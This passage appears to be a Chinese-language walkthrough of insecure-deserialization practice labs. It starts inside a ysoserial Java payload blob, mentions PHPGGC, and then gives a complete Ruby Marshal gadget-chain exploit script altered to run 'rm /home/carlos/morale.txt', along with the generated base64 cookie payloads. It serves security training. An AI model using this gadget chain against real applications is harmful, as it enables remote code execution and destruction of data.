2FybG9zL21vcmFsZS50eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBABt5c29zZXJpYWwvUHduZXI0MTMzNjg1ODEzODQBAB1MeXNvc2VyaWFsL1B3bmVyNDEzMzY4NTgxMzg0OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AHwAAAdTK%2Frq%2BAAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABcQB%2BACl4
```



在 Burp Repeater 中，将你的会话 cookie 替换为你刚刚创建的恶意 cookie。发送请求以解决实验室问题。





### PHP

类似Java的ysoserial，PHP站点可使用"PHP Generic Gadget Chains"（PHPGGC）。该工具提供针对常见PHP框架的预置利用链，如Laravel、Symfony等，支持生成反序列化载荷以验证或利用漏洞。



> 需要特别强调的是：漏洞的本质风险在于允许反序列化用户可控输入数据，而非简单的网站代码或依赖库中存在Gadget链。这种工具链仅仅是安全人员在有害数据注入成功后，用于构建攻击流量导向的辅助途径。同理，这一原理也适用于其他依赖反序列化非可信数据的各类内存破坏型漏洞。换言之，即便网站通过某些手段封堵了所有已知Gadget链途径，整个系统依然可能处于风险暴露状态。



目标应用程序所使用的框架中，可能并不总是存在专门用于利用已知小工具链的工具。在这种情况下，始终值得在线查找是否有任何已记录的漏洞利用方法，你可以手动进行调整。调整代码可能需要对该语言和框架有基本的理解，有时你可能需要自己序列化对象，但这种方法仍然比从头构建漏洞利用要省力得多。

即使你找不到现成的工具链，你仍可能获得宝贵知识，帮助你创建自己的定制漏洞利用程序。



**实验**

该实验室使用基于序列化的会话机制和 Ruby on Rails 框架。该框架中存在已记录的漏洞，可通过 gadget 链实现远程代码执行。

为了解决这个实验，找到一个有文档记录的漏洞利用方法，并对其进行调整以创建一个包含远程代码执行负载的恶意序列化对象。然后，将此对象传递到网站中，以从 Carlos 的主目录中删除 `morale.txt` 文件。

您可以使用以下凭据登录到自己的账户：`wiener:peter`



尝试在线搜索“ruby deserialization gadget chain”。



登录到您自己的账户，并注意会话 cookie 包含一个序列化（“marshaled”）的 Ruby 对象。将此会话 cookie 的请求发送到 Burp Repeater。

```
Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVudmlsaTVkM3EzbHdzOXBubnJ0MmlnZXp6NXJxNWx4bQY7B0YK
```



浏览网页以查找由 `vakzz` 在 `devcraft.io` 上发布的 `Universal Deserialisation Gadget for Ruby 2.x-3.x` 。复制生成有效载荷的最终脚本。

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```



按如下方式修改脚本：

- 将应执行的命令从 `id` 更改为 `rm /home/carlos/morale.txt` 。
- 将最后两行替换为 `puts Base64.encode64(payload)` 。这确保有效负载以正确的格式输出，供您在实验中使用。

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```



运行脚本并复制生成的 Base64 编码对象，然后对其进行 URL 编码。

```
ruby exp.rb
```

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ%3D%3D
```



在 Burp Repeater 中，将你的会话 cookie 替换为你刚刚创建的恶意 cookie，发送请求以解决实验室问题。
